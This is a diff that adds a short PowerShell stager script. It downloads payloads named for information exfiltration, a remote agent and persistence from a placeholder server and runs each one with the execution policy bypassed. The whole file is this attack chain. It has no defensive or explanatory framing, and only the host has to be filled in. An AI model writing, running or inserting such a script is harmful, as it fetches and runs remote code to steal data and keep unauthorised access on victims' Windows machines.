@@ -1,0 +1,18 @@
+# Download the infoexfil.ps1 script
+Invoke-WebRequest -Uri https://your.serverurl.com/payloads/infoexfil.ps1 -OutFile $env:USERPROFILE\Desktop\infoexfil.ps1
+
+# Start a new PowerShell instance to run infoexfil.ps1
+powershell -ExecutionPolicy Bypass -File $env:USERPROFILE\Desktop\infoexfil.ps1
+
+# Download agent
+Invoke-WebRequest -Uri https://your.serverurl.com/payloads/agent.ps1 -OutFile "$env:USERPROFILE\Desktop\agent.ps1"
+
+# Download persistence
+Invoke-WebRequest -Uri https://your.serverurl.com/payloads/persist.ps1 -OutFile "$env:USERPROFILE\Desktop\persist.ps1"
+
+# Run persistence
+powershell -ExecutionPolicy Bypass -File $env:USERPROFILE\Desktop\persist.ps1
+
+# Run agent
+powershell -ExecutionPolicy Bypass -File $env:USERPROFILE\Desktop\agent.ps1
+
